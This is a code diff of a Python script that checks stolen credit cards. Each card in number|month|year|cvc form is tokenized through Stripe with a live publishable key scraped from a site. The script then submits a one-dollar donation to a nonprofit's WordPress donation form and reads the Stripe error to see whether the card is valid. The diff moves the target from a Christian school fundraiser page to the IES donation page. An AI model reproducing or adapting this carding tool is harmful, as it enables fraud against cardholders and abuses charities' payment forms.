@@ -1,5 +1,4 @@
 import requests,re
-import random
 def Tele(ccx):
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
@@ -9,9 +8,6 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
-	
-	random_amount1 = random.randint(1, 9)
-	random_amount2 = random.randint(1, 99)
 	
 	headers = {
 	    'authority': 'api.stripe.com',
@@ -29,19 +25,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&key=pk_live_51KpzzULXTIjil4Wl456FggVEW7pLqDBKM4RnzNb1oZK71a0lWsZo7WjvXkgKKyeQor012ypYMjDzfhf5Fb2AnvoE00VOhZ93NA'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&referrer=https%3A%2F%2Fwww.ies.org&key=pk_live_51P9TaAICMxuGGufT8bmFY2rhq9xRyVXjNbKKfWPDnxokLQfxvLtuodinmJWEvfSwDYd3eTVb3hM79F0A5nytwp8l00vaSpJTcY'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'orangevillechristianschool.com',
+	    'authority': 'www.ies.org',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://orangevillechristianschool.com',
-	    'referer': 'https://orangevillechristianschool.com/golf-tournament-fundraiser/',
+	    'origin': 'https://www.ies.org',
+	    'referer': 'https://www.ies.org/membership/donate/general/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -53,21 +49,16 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1751694981093',
+	    't': '1751820013450',
 	}
 	
 	data = {
-	    'data': f'__fluent_form_embded_post_id=8832&_fluentform_50_fluentformnonce=54d844f504&_wp_http_referer=%2Fgolf-tournament-fundraiser%2F&input_radio=Dinner%20Only&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&address_1%5Baddress_line_1%5D=Street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&phone=%2B14303000850&email=rodamuser{random_amount1}{random_amount2}%40gmail.com&numeric_field_4=125&custom-payment-amount_4={random_amount1}.{random_amount2}&dropdown=Credit%20Card&payment_method=stripe&signature=&__stripe_payment_method_id={pm}',
+	    'data': f'item_24__fluent_sf=&__fluent_form_embded_post_id=157046&_fluentform_24_fluentformnonce=4f689476d3&_wp_http_referer=%2Fmembership%2Fdonate%2Fgeneral%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&in_honor_of=no&donation_amount=Custom%20Amount&custom_donation_amount=1&payment_method=stripe&__stripe_payment_method_id={pm}',
 	    'action': 'fluentform_submit',
-	    'form_id': '50',
+	    'form_id': '24',
 	}
 	
-	response = requests.post(
-	    'https://orangevillechristianschool.com/wp-admin/admin-ajax.php',
-	    params=params,
-	    headers=headers,
-	    data=data,
-	)
+	response = requests.post('https://www.ies.org/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
 	
 	try:
 		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
